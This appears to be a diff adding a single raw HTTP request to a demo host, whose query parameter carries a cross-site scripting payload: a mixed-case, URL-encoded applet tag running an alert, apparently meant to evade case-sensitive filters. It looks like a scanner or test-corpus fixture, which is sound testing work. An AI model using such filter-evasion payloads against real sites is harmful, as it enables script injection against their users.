@@ -1,0 +1,4 @@
+GET /a?id=<aPpLeT%20cOdE%3D"jAvAsCrIpT:aLeRt(1)"> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
